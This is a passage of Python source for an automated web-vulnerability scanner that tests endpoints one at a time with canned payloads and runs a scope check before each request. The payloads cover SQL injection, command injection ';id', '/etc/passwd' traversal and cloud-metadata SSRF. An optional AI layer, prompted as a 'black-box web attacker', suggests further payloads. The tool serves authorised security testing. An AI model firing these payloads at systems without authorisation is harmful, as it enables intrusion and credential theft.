#!/usr/bin/env python3
"""
ARISE — Adaptive Endpoint Attack Loop (Phase 3: FSM core, DETERMINISTIC)
========================================================================
Closes the recon→attack circle. Where the pipeline runs ATTACK as linear
one-shot passes, this walks the URL inventory ONE ENDPOINT AT A TIME through a
bounded state machine:

    OBSERVE ─▶ CLASSIFY ─▶ HYPOTHESIZE ─▶ MUTATE ─▶ FIRE ─▶ VERIFY
       │                                                        │
       └──────────── refuted → next recipe ─────────────────────┘

This is the DETERMINISTIC core — NO AI. Hypotheses come from the classified
attack lanes (08_directory_discovery/attack_routing.jsonl), the P2 typed error
seeds (26_response_intel/attack_hypotheses.jsonl), and the inventory facts. The
mutations are canned per-lane payloads. The verdict is the existing 0%-FP oracle
library (discovery/response_analysis.py) — a finding is emitted ONLY when the
response is self-evidence of the bug (SQL error, boolean/timing differential,
unencoded reflection, evaluated template, leaked /etc/passwd, metadata creds).
The AI mutation brain and the CAPEC feedback edge are later phases (P4, P5).

WHAT IT WIRES (existing engines, nothing reinvented):
  * ScopeGuard (ai/ai_probing.py) — every outbound request is scope-checked; SSRF
    magnets (169.254.169.254, localhost) are refused even if the payload carries
    them, because the REQUEST host must be the target.
  * _fetch (intel/response_intel.py) — the bounded stdlib fetcher.
  * response_analysis oracles (discovery/response_analysis.py) — the VERIFY gate.
  * classify_response (ai/arise_nlp.py) — the CLASSIFY step.

SAFETY (code-enforced, not prompt discipline):
  * NON-DESTRUCTIVE — only GET and OPTIONS are ever sent. State-changing method
    seeds (PUT/DELETE/PATCH) are surfaced as `observed`, never fired.
  * SCOPE-LOCKED — out-of-scope URLs are refused before a socket opens.
  * BOUNDED — global request budget, per-endpoint request budget, seed cap, and
    an overall wall-clock deadline. The loop degrades to empty output on a
    missing inventory and NEVER raises into the caller.

Output (per scan, under 27_adaptive_loop/):
  loop_findings.jsonl    confirmed/observed findings, nuclei-shaped (so
                         internet_intel + capec_attack_paths can consume them
                         exactly like a template hit — wired in P6)
  loop_transcript.jsonl  per-endpoint FSM audit (every stage, every request)
  loop_summary.json      counts, budget usage, by-lane, confirmed vs refuted

Usage:
    python3 adaptive_loop.py <scan_dir> [--target T] [--max-requests N]
        [--per-endpoint N] [--max-seeds N] [--budget S] [--timeout N] [--summary]
    python3 adaptive_loop.py --selftest
"""
from __future__ import annotations

import sys as _sys, os as _os
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
if _ROOT not in _sys.path:
    _sys.path.insert(0, _ROOT)

import argparse
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

from ai.ai_probing import ScopeGuard
from discovery import response_analysis as ora

# The fetcher is injectable so tests can run fully offline. Default is the
# bounded stdlib fetcher already used by Module 26.
try:
    from intel.response_intel import _fetch as _default_fetch
except Exception:  # pragma: no cover
    def _default_fetch(url, method="GET", timeout=8):
        return 0, {}, "", 0.0

try:
    from ai.arise_nlp import classify_response
except Exception:  # pragma: no cover
    def classify_response(body, headers, status):
        return {"response_class": "html" if "<html" in (body or "").lower() else "other"}


# ---------------------------------------------------------------------------
# Config + budgets
# ---------------------------------------------------------------------------

@dataclass
class LoopConfig:
    max_requests: int = 300      # global request budget
    per_endpoint: int = 8        # per-seed request budget
    max_seeds: int = 200         # worklist cap
    budget_s: int = 600          # overall wall-clock deadline
    timeout: int = 8             # per-request timeout
    max_chain_depth: int = 2     # P5: how many escalation hops a confirmed finding may spawn
    # --- P4 AI brain (opt-in; degrades to deterministic on any failure) ---
    ai_enabled: bool = False     # turn the AI hypothesis/mutation layer on
    ai_provider: str = ""        # "", claude, openai, gemini … (synth_ai.build_chat_fn)
    ai_model: str = ""
    ai_max_calls: int = 40       # global cap on model calls (cost bound)
    ai_recipes_cap: int = 4      # max AI recipes accepted per endpoint


@dataclass
class Budget:
    remaining: int
    deadline: float

    def can_spend(self) -> bool:
        return self.remaining > 0 and time.monotonic() < self.deadline

    def spend(self) -> None:
        self.remaining -= 1


# ---------------------------------------------------------------------------
# Seed (a worklist item) + records
# ---------------------------------------------------------------------------

@dataclass
class Seed:
    url: str
    host: str
    lane: str
    method: str = "GET"
    methods: List[str] = field(default_factory=list)
    url_class: str = ""
    status: int = 0
    tech: str = ""
    evidence: str = ""
    why: str = ""
    source: str = ""
    priority: int = 2           # 0 = highest
    depth: int = 0              # P5 chain depth (0 = original worklist seed)


# ---------------------------------------------------------------------------
# Lane → attack recipes (deterministic). Each recipe is (mode, oracle, spec).
# mode drives how FIRE builds requests and how VERIFY is called.
#   single       — inject one payload, run a single-response oracle
#   differential — inject true/false payloads, run a differential oracle
#   timing       — inject a delay payload, run a timing oracle
#   options      — OPTIONS probe (read Allow), observed-only
#   passive      — the seed's own evidence is the finding (no request)
# Only GET + OPTIONS are ever sent.
# ---------------------------------------------------------------------------

# Non-destructive command-injection payloads: run `id` (prints uid=…gid=…, the
# cmd_injection oracle's proof) via each shell separator, plus one blind sleep
# (confirmed by a timing delay). No state change — the same PoC offensive_verify
# and response_analysis already use.
_CMD_SPEC = {"param": "cmd", "payloads": [";id", "|id", "$(id)", ";sleep 5"]}

RECIPES: Dict[str, List[Tuple[str, str, dict]]] = {
    "sqli": [
        ("single", "sql_error", {"param": "id", "payloads": ["'", "1'\"", "1' OR '1'='1"]}),
        ("differential", "sql_boolean",
         {"param": "id", "true": "1' AND '1'='1", "false": "1' AND '1'='2"}),
        ("timing", "sql_time", {"param": "id", "payload": "1' AND SLEEP(5)-- -"}),
    ],
    "xss": [("single", "reflected_xss", {"param": "q", "payloads": ["\"><arisexss>"]})],
    "ssti": [("single", "ssti", {"param": "q", "payloads": ["{{7*7}}", "${7*7}"]})],
    "ssti-lfi": [
        ("single", "ssti", {"param": "q", "payloads": ["{{7*7}}"]}),
        ("single", "lfi_passwd",
         {"param": "page", "payloads": ["../../../../../../etc/passwd",
                                        "....//....//....//....//etc/passwd"]}),
        ("single", "cmd_injection", _CMD_SPEC),   # server-side eval surface → also try OS cmd
    ],
    # dedicated command-injection lanes (if any source classifies one)
    "rce": [("single", "cmd_injection", _CMD_SPEC)],
    "cmd": [("single", "cmd_injection", _CMD_SPEC)],
    "code-injection": [("single", "cmd_injection", _CMD_SPEC),
                       ("single", "ssti", {"param": "q", "payloads": ["{{7*7}}"]})],
    # payloads are encoding-safe: a raw ../ (urlencode → %2F, decoded server-side)
    # and the ....// filter-bypass (no % → survives urlencoding intact). The old
    # pre-encoded ..%2f was double-encoded to ..%252f and never worked.
    "lfi": [("single", "lfi_passwd",
             {"param": "page", "payloads": ["../../../../../../etc/passwd",
                                            "....//....//....//....//etc/passwd"]})],
    "traversal": [("single", "lfi_passwd",
                   {"param": "file", "payloads": ["../../../../../../etc/passwd"]})],
    "ssrf": [("single", "ssrf_metadata",
              {"param": "url", "payloads": ["http://169.254.169.254/latest/meta-data/"]})],
    "open-redirect": [("single", "open_redirect",
                       {"param": "redirect", "payloads": ["https://arise-oob.example/"],
                        "attacker_host": "arise-oob.example"})],
    "dangerous-methods": [("options", "allow_verbs", {})],
    "methods": [("options", "allow_verbs", {})],
    # passive lanes — the P2 error seed IS the evidence
    "disclosure": [("passive", "seed_evidence", {"severity": "medium"})],
    "version-swap": [("passive", "seed_evidence", {"severity": "info"})],
}

# lanes recognised but with no deterministic native recipe (need auth, two
# identities, or the heavier offensive_verify engine) — recorded, not fired.
DEFERRED_LANES = {
    "bola": "needs two authenticated identities (offensive_verify BFLA/BOLA)",
    "idor": "needs two authenticated identities (offensive_verify BFLA/BOLA)",
    "auth-jwt": "needs a real token to forge/replay (offensive_verify check_jwt)",
    "jwt": "needs a real token to forge/replay (offensive_verify check_jwt)",
    "graphql": "needs introspection/mutation flow (offensive_verify check_graphql)",
    "file-upload": "needs a multipart upload + retrieval (state-changing)",
    "upload": "needs a multipart upload + retrieval (state-changing)",
}

# Per-oracle finding metadata (severity, cwe) for nuclei-shaping.
_ORACLE_META = {
    "sql_error": ("high", "89"), "sql_boolean": ("high", "89"), "sql_time": ("high", "89"),
    "reflected_xss": ("high", "79"), "ssti": ("high", "94"), "lfi_passwd": ("high", "22"),
    "ssrf_metadata": ("critical", "918"), "open_redirect": ("medium", "601"),
    "cmd_injection": ("critical", "78"), "user_enum": ("medium", "203"),
    "allow_verbs": ("medium", "650"), "seed_evidence": ("medium", "200"),
}

# Lanes that have NO deterministic recipe but are worth an AI probe rather than
# being dropped (the biggest lanes on API-heavy targets). Only admitted to the
# worklist when the AI brain is enabled — otherwise they'd just waste baselines.
AI_PROBE_LANES = {"api-blackbox", "api", "sensitive-review"}

_LANE_PRIORITY = {  # lower = attacked first
    "sqli": 0, "ssrf": 0, "ssti": 0, "ssti-lfi": 0, "lfi": 0, "traversal": 0,
    "rce": 0, "cmd": 0, "code-injection": 0,
    "xss": 1, "open-redirect": 1, "dangerous-methods": 1, "methods": 1,
    "disclosure": 2, "version-swap": 2,
    "api-blackbox": 3, "api": 3, "sensitive-review": 3,
}


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def _iter_jsonl(path: Path):
    if not path.exists():
        return
    try:
        with path.open() as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    yield json.loads(line)
                except Exception:
                    continue
    except Exception:
        return


def _host_of(url: str) -> str:
    try:
        return (urllib.parse.urlparse(url).hostname or "").lower()
    except Exception:
        return ""


def _inject(url: str, param: str, payload: str) -> str:
    """Put `payload` into a query parameter of `url`. Prefer an existing param
    matching `param` (or, failing that, the first existing param); otherwise add
    `param=payload`. Deterministic and side-effect free."""
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if qs:
        names = [k for k, _ in qs]
        target = param if param in names else names[0]
        qs = [(k, payload if k == target else v) for k, v in qs]
    else:
        qs = [(param, payload)]
    new_q = urllib.parse.urlencode(qs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_q, parts.fragment))


def _resp_dict(status: int, headers: Dict[str, str], body: str, elapsed: float) -> dict:
    return {"status": status, "headers": headers or {}, "body": body or "",
            "elapsed_ms": int(elapsed * 1000)}


def _candidate_params(url: str, preferred: str, cap: int = 4) -> List[str]:
    """Which query params to inject into. Prefer the recipe's canonical name if
    the URL has it, then every OTHER existing param (so a bug in the 2nd/3rd
    param isn't missed); if the URL has no query at all, add `preferred` as a new
    param. Bounded so a wide endpoint can't blow the budget."""
    existing = list(dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query,
                                                keep_blank_values=True)).keys())
    if not existing:
        return [preferred]
    ordered = ([preferred] if preferred in existing else []) + \
              [p for p in existing if p != preferred]
    return ordered[:cap]


def lfi_passwd(req: dict, resp: dict) -> Optional[ora.Finding]:
    """Inline oracle response_analysis doesn't ship: /etc/passwd content."""
    body = resp.get("body", "") or ""
    if re.search(r"root:.?:0:0:", body) or re.search(r"\[boot loader\]|\[fonts\]", body, re.I):
        return ora.Finding("lfi_passwd", "high", "file inclusion returned /etc/passwd or win.ini content")
    return None


def allow_verbs(seed: Seed, resp: dict) -> Optional[ora.Finding]:
    """OPTIONS/observed oracle: state-changing verbs advertised in Allow."""
    allow = ""
    for k, v in (resp.get("headers") or {}).items():
        if k.lower() == "allow":
            allow = (v or "").upper()
            break
    dangerous = sorted({m for m in ("PUT", "DELETE", "PATCH") if m in allow}
                       | {m.upper() for m in seed.methods} & {"PUT", "DELETE", "PATCH"})
    if dangerous:
        return ora.Finding("allow_verbs", "medium",
                           f"state-changing verbs exposed: {', '.join(dangerous)} "
                           f"(Allow: {allow or 'from inventory'})")
    return None


# ---------------------------------------------------------------------------
# P4 — AI hypothesis + mutation brain.
#
# The model PROPOSES; code DISPOSES. Every AI-proposed recipe is (1) restricted
# to the known oracle catalog, (2) sanitised, (3) fired only through the same
# scope-checked, budgeted, GET/OPTIONS-only machinery, and (4) judged by the
# same 0%-FP oracle library. The AI can therefore only surface MORE true
# positives (right param, tech-matched payload, an attack class the lane label
# missed) — it can never mint a false one. It runs ONLY after the deterministic
# recipes refute, so easy wins cost no tokens.
# ---------------------------------------------------------------------------

# oracle -> the FIRE mode that drives it (single / differential / timing)
_ORACLE_MODE = {
    "sql_error": "single", "reflected_xss": "single", "ssti": "single",
    "lfi_passwd": "single", "ssrf_metadata": "single", "open_redirect": "single",
    "cmd_injection": "timing", "sql_time": "timing",
    "sql_boolean": "differential", "user_enum": "differential",
}
AI_ORACLES = set(_ORACLE_MODE)
_DEFAULT_PARAM = {
    "sql_error": "id", "sql_boolean": "id", "sql_time": "id", "cmd_injection": "cmd",
    "reflected_xss": "q", "ssti": "q", "lfi_passwd": "file", "ssrf_metadata": "url",
    "open_redirect": "redirect", "user_enum": "username",
}

AI_HYPOTHESIS_SYSTEM = (
    "You are a black-box web attacker choosing the next probe for ONE endpoint whose generic "
    "per-lane payloads already failed (or which has no canned recipe at all). Given the "
    "endpoint facts and its OBSERVED baseline "
    "response, propose up to {cap} sharper attack recipes — inject into the SPECIFIC parameter "
    "you can see, use a payload matched to the observed tech, or pick an attack class the lane "
    "label didn't cover. You may ONLY use these confirmation oracles (the tool decides the "
    "verdict from the response, so choose the oracle whose evidence your payload will actually "
    "produce):\n"
    "  sql_error   — DB error text in body (payload: a quote/syntax breaker)\n"
    "  sql_boolean — true vs false pages differ (give 'true' AND 'false' payloads)\n"
    "  sql_time    — response delayed (payload with SLEEP/WAITFOR/PG_SLEEP)\n"
    "  reflected_xss — your <tag> reflected unencoded in HTML\n"
    "  ssti        — {{7*7}}-style expression evaluates to 49\n"
    "  lfi_passwd  — /etc/passwd or win.ini content returned\n"
    "  ssrf_metadata — cloud metadata/creds returned (payload: an internal URL)\n"
    "  open_redirect — Location header points to an external host you name\n"
    "  cmd_injection — uid=…gid=… output, or a sleep delay\n"
    "  user_enum   — valid vs invalid account responses differ (give 'true'/'false')\n"
    "All oracles are GET-based reads — never propose a state-changing request.\n"
    "Return ONLY a JSON array; each item is either\n"
    '  {\"oracle\":\"sql_error\",\"param\":\"id\",\"payloads\":[\"\\u0027\",\"1\\u0027\\\"\"]}\n'
    "or for sql_boolean/user_enum\n"
    '  {\"oracle\":\"sql_boolean\",\"param\":\"id\",\"true\":\"1 AND 1=1\",\"false\":\"1 AND 1=2\"}\n'
    "No prose. If nothing is worth trying, return []."
)


def _safe_chat(chat_fn, system: str, user: str) -> Tuple[Optional[str], Optional[str]]:
    """Call the model without ever raising into the loop."""
    try:
        return chat_fn(system, user)
    except Exception as exc:  # noqa: BLE001
        return None, f"chat raised: {str(exc)[:120]}"


def _sanitize_param(p: str, fallback: str) -> str:
    p = re.sub(r"[^A-Za-z0-9_.\-]", "", str(p or ""))[:40]
    return p or fallback


def _normalize_ai_recipe(obj: dict) -> Optional[Tuple[str, str, dict]]:
    """Turn one model-proposed object into an internal (mode, oracle, spec) tuple,
    or None if it is malformed / uses an unknown oracle. spec is tagged _ai."""
    if not isinstance(obj, dict):
        return None
    oracle = str(obj.get("oracle", "")).strip()
    if oracle not in AI_ORACLES:
        return None
    mode = _ORACLE_MODE[oracle]
    param = _sanitize_param(obj.get("param", ""), _DEFAULT_PARAM.get(oracle, "q"))
    if mode == "differential":
        t, f = obj.get("true"), obj.get("false")
        if not t or not f:
            return None
        return (mode, oracle, {"param": param, "true": str(t)[:200],
                               "false": str(f)[:200], "_ai": True})
    # single / timing
    payloads = obj.get("payloads")
    if not payloads and obj.get("payload"):
        payloads = [obj["payload"]]
    payloads = [str(p)[:200] for p in (payloads or []) if str(p).strip()][:3]
    if not payloads:
        return None
    spec = {"param": param, "payloads": payloads, "_ai": True}
    if mode == "timing":
        spec["payload"] = payloads[0]
    if oracle == "open_redirect":
        spec["attacker_host"] = _host_of(payloads[0])
    return (mode, oracle, spec)


def ai_propose_recipes(seed: "Seed", base: dict, chat_fn, cap: int
                       ) -> Tuple[List[Tuple[str, str, dict]], Optional[str]]:
    """Ask the model for extra recipes for a hard endpoint. Returns (recipes, err).
    Always safe: any failure yields ([], reason) and the loop carries on."""
    try:
        from discovery.synth_ai import _first_json
    except Exception:  # pragma: no cover
        _first_json = None
    params = list(dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(seed.url).query)).keys())
    ct = ""
    for k, v in (base.get("headers") or {}).items():
        if k.lower() == "content-type":
            ct = v
            break
    ctx = {
        "url": seed.url, "lane": seed.lane, "method": seed.method,
        "url_class": seed.url_class, "tech": seed.tech,
        "existing_params": params[:12],
        "baseline": {"status": base.get("status"), "content_type": ct,
                     "body_excerpt": (base.get("body") or "")[:1200]},
    }
    text, err = _safe_chat(chat_fn, AI_HYPOTHESIS_SYSTEM.replace("{cap}", str(cap)),
                           "ENDPOINT (JSON):\n" + json.dumps(ctx)[:6000])
    if err or not text:
        return [], err or "empty AI response"
    arr = _first_json(text) if _first_json else None
    if not isinstance(arr, list):
        return [], "AI response was not a JSON array"
    out = []
    for obj in arr[:cap]:
        rec = _normalize_ai_recipe(obj)
        if rec:
            out.append(rec)
    return out, (None if out else "AI proposed nothing usable")


# ---------------------------------------------------------------------------
# Worklist builder
# ---------------------------------------------------------------------------

def build_worklist(scan_dir: str, scope: ScopeGuard, cfg: LoopConfig) -> List[Seed]:
    """Merge inventory lanes + P2 typed seeds into a prioritised, scope-filtered,
    deduped worklist of (url, lane) attack targets."""
    sp = Path(scan_dir)
    seeds: Dict[Tuple[str, str], Seed] = {}   # (url, lane) -> Seed (best)

    def _add(url, lane, **kw):
        url = (url or "").strip()
        lane = (lane or "").strip()
        known = (lane in RECIPES or lane in DEFERRED_LANES
                 or (lane in AI_PROBE_LANES and cfg.ai_enabled))
        if not url or not lane or not known:
            return
        if not scope.in_scope(url):
            return
        key = (url, lane)
        pri = _LANE_PRIORITY.get(lane, 2)
        cur = seeds.get(key)
        s = Seed(url=url, host=kw.get("host") or _host_of(url), lane=lane,
                 method=kw.get("method", "GET"), methods=kw.get("methods", []) or [],
                 url_class=kw.get("url_class", ""), status=kw.get("status", 0),
                 tech=kw.get("tech", ""), evidence=kw.get("evidence", ""),
                 why=kw.get("why", ""), source=kw.get("source", ""), priority=pri)
        # keep the seed with the richer evidence (P2 seed beats a bare lane label)
        if cur is None or (not cur.evidence and s.evidence):
            seeds[key] = s

    # 1. P2 typed hypotheses (highest-quality, carry evidence + tech)
    for r in _iter_jsonl(sp / "26_response_intel" / "attack_hypotheses.jsonl"):
        _add(r.get("url"), r.get("lane"), host=r.get("host"), method=r.get("method", "GET"),
             methods=r.get("methods", []), status=r.get("status", 0), tech=r.get("tech", ""),
             evidence=r.get("evidence", ""), why=r.get("why", ""),
             source=r.get("source", "response_intel"))

    # 2. attack_routing lanes (the classified surface)
    for r in _iter_jsonl(sp / "08_directory_discovery" / "attack_routing.jsonl"):
        _add(r.get("url"), r.get("attack"), host=r.get("host"),
             methods=r.get("methods", []), status=r.get("status", 0),
             url_class=r.get("url_class", ""), source="attack_routing")

    ordered = sorted(seeds.values(), key=lambda s: (s.priority, not bool(s.evidence)))
    return ordered[: cfg.max_seeds]


# ---------------------------------------------------------------------------
# The per-endpoint FSM
# ---------------------------------------------------------------------------

def _mk_finding(seed: Seed, oracle: str, f: ora.Finding, attack_url: str,
                confirmed: bool, proposed_by: str = "deterministic") -> dict:
    """Shape a confirmed/observed result like a nuclei finding so downstream
    (internet_intel, capec_attack_paths) consume it identically to a template."""
    sev, cwe = _ORACLE_META.get(oracle, ("info", "200"))
    if not confirmed and sev in ("critical", "high"):
        sev = "medium"   # observed (not exploitation-proven) never outranks confirmed
    return {
        "template-id": f"arise-adaptive-{oracle}",
        "matched-at": attack_url,
        "host": seed.host,
        "type": "http",
        "info": {
            "name": f"Adaptive loop: {oracle} on {seed.lane}",
            "severity": sev,
            "tags": ["arise", "adaptive", seed.lane, oracle],
            "classification": {"cwe-id": [f"CWE-{cwe}"]},
        },
        "extracted-results": [f.evidence[:300]],
        "arise_provenance": {
            "engine": "adaptive_loop", "oracle": oracle, "lane": seed.lane,
            "confirmed": confirmed, "confidence": f.confidence,
            "proposed_by": proposed_by,
            "why": seed.why, "source_seed": seed.source,
        },
    }


# P5 — the feedback edge. A CONFIRMED finding unlocks a follow-on attack class on
# the SAME endpoint (CAPEC CanPrecede, grounded to lanes with a deterministic
# recipe that are a real escalation). Keyed on the CONFIRMING ORACLE — not the
# lane — so we only chain to a genuinely NEW attack: SSTI (template eval) → RCE
# (OS command exec). If the seed already confirmed via cmd_injection there is
# nothing new to escalate to. Depth-capped so a chain cannot run away.
FOLLOWON_BY_ORACLE = {
    "ssti": ["rce"],   # template expression evaluated → attempt OS command execution
}


def _followon_seeds(seed: Seed, finding: dict, seen: set, max_depth: int) -> List[Seed]:
    """Given a confirmed finding on `seed`, return the next-hop attack seeds,
    based on WHICH oracle confirmed (so we never re-run the attack that just won)."""
    prov = finding["arise_provenance"]
    if not prov.get("confirmed") or seed.depth >= max_depth:
        return []
    oracle = prov.get("oracle", "")
    out = []
    for lane in FOLLOWON_BY_ORACLE.get(oracle, []):
        if lane not in RECIPES:
            continue
        key = (seed.url, lane)
        if key in seen:
            continue
        seen.add(key)
        out.append(Seed(
            url=seed.url, host=seed.host, lane=lane, method=seed.method,
            methods=list(seed.methods), url_class=seed.url_class, status=seed.status,
            tech=seed.tech,
            evidence=f"chained from {oracle} @ {seed.url}",
            why=f"escalation: {oracle} confirmed → attempt {lane}",
            source=f"chain:{oracle}", priority=0, depth=seed.depth + 1))
    return out


def run_endpoint(seed: Seed, scope: ScopeGuard, budget: Budget, fetch: Callable,
                 cfg: LoopConfig, baseline_cache: Optional[Dict[str, dict]] = None,
                 chat_fn: Optional[Callable] = None, ai_budget: Optional[Budget] = None
                 ) -> Tuple[List[dict], Optional[dict]]:
    """Walk one seed through observe→classify→hypothesize→mutate→fire→verify.
    Returns (transcript_steps, finding_or_None). Never raises. `baseline_cache`
    (url→clean response) is shared across seeds so an endpoint tagged with
    several lanes is baselined once, not once per lane. When `chat_fn` is given
    and the deterministic recipes refute, the AI brain (P4) proposes sharper
    recipes for this one endpoint (bounded by `ai_budget`)."""
    steps: List[dict] = []

    def _step(stage, note, **extra):
        steps.append({"seed": f"{seed.lane}@{seed.url}"[:160], "stage": stage,
                      "note": note, **extra})

    def _scoped_fetch(url, method="GET"):
        if not budget.can_spend():
            _step("fire", "budget exhausted", url=url)
            return None
        if not scope.in_scope(url):
            _step("fire", "REFUSED out-of-scope", url=url)
            return None
        budget.spend()
        try:
            st, hd, bd, el = fetch(url, method, cfg.timeout)
            return _resp_dict(st, hd, bd, el)
        except Exception as exc:  # noqa: BLE001
            _step("fire", f"fetch error: {str(exc)[:80]}", url=url)
            return None

    # ---- passive lane: the seed's own evidence is the finding (no request) ----
    recipes = RECIPES.get(seed.lane)
    if recipes and recipes[0][0] == "passive":
        _step("observe", "passive lane — using P2 seed evidence")
        spec = recipes[0][2]
        f = ora.Finding("seed_evidence", "medium", seed.evidence or seed.why or seed.lane)
        meta_sev = spec.get("severity", "medium")
        finding = _mk_finding(seed, "seed_evidence", f, seed.url, confirmed=False)
        finding["info"]["severity"] = meta_sev
        _step("verify", f"observed ({seed.lane})", confirmed=False)
        return steps, finding

    if seed.lane in DEFERRED_LANES:
        _step("hypothesize", f"deferred: {DEFERRED_LANES[seed.lane]}")
        return steps, None
    # AI-probe lanes have no deterministic recipe but still OBSERVE and hand the
    # response to the AI brain below. Everything else with no recipe is skipped.
    is_ai_probe = seed.lane in AI_PROBE_LANES
    if not recipes and not is_ai_probe:
        _step("hypothesize", "no deterministic recipe for lane")
        return steps, None

    # ---- OBSERVE: clean baseline (shared across lanes of the same URL) ----
    if baseline_cache is not None and seed.url in baseline_cache:
        base = baseline_cache[seed.url]
        _step("observe", f"baseline (cached) status={base['status']} len={len(base['body'])}")
    else:
        base = _scoped_fetch(seed.url, "GET")
        if base is None:
            return steps, None
        if baseline_cache is not None:
            baseline_cache[seed.url] = base
        _step("observe", f"baseline status={base['status']} len={len(base['body'])}")

    # ---- CLASSIFY ----
    cls = classify_response(base["body"], base["headers"], base["status"]).get("response_class", "")
    _step("classify", f"response_class={cls}")
    if cls == "waf_block":
        _step("classify", "WAF block — aborting endpoint")
        return steps, None

    # ---- HYPOTHESIZE → MUTATE → FIRE → VERIFY. Runs a recipe batch under a
    #      local request cap; returns a finding on the first confirmation. Used
    #      once for the deterministic recipes and (if they refute) once for the
    #      AI-proposed ones. ----
    def _process(recipe_batch, cap, provenance):
        start = budget.remaining
        for mode, oracle, spec in recipe_batch:
            if start - budget.remaining >= cap:
                _step("fire", "per-endpoint budget reached")
                break
            _step("hypothesize", f"{mode}/{oracle}", proposed_by=provenance)

            if mode == "options":
                resp = _scoped_fetch(seed.url, "OPTIONS")
                if resp is None:
                    continue
                f = allow_verbs(seed, resp)
                _step("verify", "fired" if f else "refuted", oracle=oracle)
                if f:
                    return _mk_finding(seed, oracle, f, seed.url, False, provenance)
                continue

            if mode == "single":
                rec_start = budget.remaining          # per-recipe request guard
                for param in _candidate_params(seed.url, spec["param"]):
                    if rec_start - budget.remaining >= cap:
                        break
                    for payload in spec["payloads"]:
                        if rec_start - budget.remaining >= cap:
                            break
                        atk = _inject(seed.url, param, payload)
                        resp = _scoped_fetch(atk, "GET")
                        if resp is None:
                            break
                        req = {"payload": payload, "attacker_host": spec.get("attacker_host", "")}
                        f = lfi_passwd(req, resp) if oracle == "lfi_passwd" \
                            else ora.run_oracle(oracle, req, resp)
                        if f:
                            _step("verify", "CONFIRMED", oracle=oracle, param=param,
                                  payload=payload, proposed_by=provenance)
                            return _mk_finding(seed, oracle, f, atk, True, provenance)
                _step("verify", "refuted", oracle=oracle)

            elif mode == "differential":
                a_url = _inject(seed.url, spec["param"], spec["true"])
                a = _scoped_fetch(a_url, "GET")
                a2 = _scoped_fetch(a_url, "GET")     # stability control: same payload twice
                b = _scoped_fetch(_inject(seed.url, spec["param"], spec["false"]), "GET")
                if a is None or a2 is None or b is None:
                    continue
                # Dynamic-page guard: if two IDENTICAL requests already differ, the
                # page is noisy (timestamp/nonce/ads) and a true-vs-false delta is
                # meaningless — the classic boolean-SQLi false positive. Refuse.
                if ora._distinguishable(a, a2):
                    _step("verify", "refuted (page unstable — boolean unreliable)", oracle=oracle)
                    continue
                req = {"payload_true": spec["true"], "payload_false": spec["false"]}
                f = ora.run_oracle(oracle, req, {"a": a, "b": b})
                if f:
                    _step("verify", "CONFIRMED", oracle=oracle, proposed_by=provenance)
                    return _mk_finding(seed, oracle, f, a_url, True, provenance)
                _step("verify", "refuted", oracle=oracle)

            elif mode == "timing":
                atk = _inject(seed.url, spec["param"], spec["payload"])
                resp = _scoped_fetch(atk, "GET")
                if resp is None:
                    continue
                f = ora.run_oracle(oracle, {"payload": spec["payload"]}, resp)
                if f:
                    _step("verify", "CONFIRMED", oracle=oracle,
                          elapsed_ms=resp["elapsed_ms"], proposed_by=provenance)
                    return _mk_finding(seed, oracle, f, atk, True, provenance)
                _step("verify", "refuted", oracle=oracle)
        return None

    # 1) deterministic recipes (empty for AI-probe lanes → straight to the AI pass)
    finding = _process(recipes or [], cfg.per_endpoint, "deterministic")
    if finding:
        return steps, finding

    # 2) P4 AI brain — only for hard endpoints that refuted, and only while the
    #    model-call budget lasts. Any failure degrades silently to plain P3.
    if chat_fn and ai_budget is not None and ai_budget.can_spend():
        ai_budget.spend()
        ai_recipes, err = ai_propose_recipes(seed, base, chat_fn, cfg.ai_recipes_cap)
        if ai_recipes:
            _step("hypothesize", f"AI proposed {len(ai_recipes)} recipe(s)", proposed_by="ai")
            finding = _process(ai_recipes, cfg.per_endpoint, "ai")
            if finding:
                return steps, finding
        else:
            _step("hypothesize", f"AI added nothing ({err})", proposed_by="ai")

    return steps, None


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def run_adaptive_loop(scan_dir: str, target: str = "", cfg: Optional[LoopConfig] = None,
                      fetch: Optional[Callable] = None,
                      chat_fn: Optional[Callable] = None) -> dict:
    cfg = cfg or LoopConfig()
    fetch = fetch or _default_fetch
    sp = Path(scan_dir)
    out_dir = sp / "27_adaptive_loop"
    out_dir.mkdir(parents=True, exist_ok=True)

    # scope: target + allowlist (hosts seen in the inventory)
    allow = []
    for r in _iter_jsonl(sp / "08_directory_discovery" / "discovered_endpoints.jsonl"):
        h = r.get("host")
        if h:
            allow.append(h)
        if len(allow) > 500:
            break
    if not target:
        target = _infer_target(sp) or (allow[0] if allow else "")
    scope = ScopeGuard(target, allowlist=sorted(set(allow)))

    # P4 AI brain — opt-in, fail-safe. A missing key / SDK / provider error just
    # leaves chat_fn None and the loop runs exactly as deterministic P3.
    ai_note = "disabled"
    if cfg.ai_enabled and chat_fn is None:
        try:
            from discovery.synth_ai import build_chat_fn
            chat_fn, cerr = build_chat_fn(cfg.ai_provider or None, cfg.ai_model or None)
            ai_note = "enabled" if chat_fn else f"unavailable ({cerr})"
        except Exception as exc:  # noqa: BLE001
            chat_fn, ai_note = None, f"unavailable ({str(exc)[:80]})"
    elif chat_fn is not None:
        ai_note = "enabled (injected)"

    seeds = build_worklist(scan_dir, scope, cfg)
    deadline = time.monotonic() + cfg.budget_s
    budget = Budget(remaining=cfg.max_requests, deadline=deadline)
    ai_budget = Budget(remaining=cfg.ai_max_calls, deadline=deadline) if chat_fn else None

    findings: List[dict] = []
    transcript: List[dict] = []
    by_lane: Dict[str, int] = {}
    baseline_cache: Dict[str, dict] = {}   # url → clean response, shared across lanes
    confirmed = observed = refuted = ai_confirmed = chained_seeds = chain_confirmed = 0

    # P5: a work queue (not a static list) so a confirmed finding can push its
    # escalation seeds to the FRONT and have them attacked immediately (depth-first
    # chaining). `seen` prevents re-seeding the same (url, lane) twice.
    from collections import deque
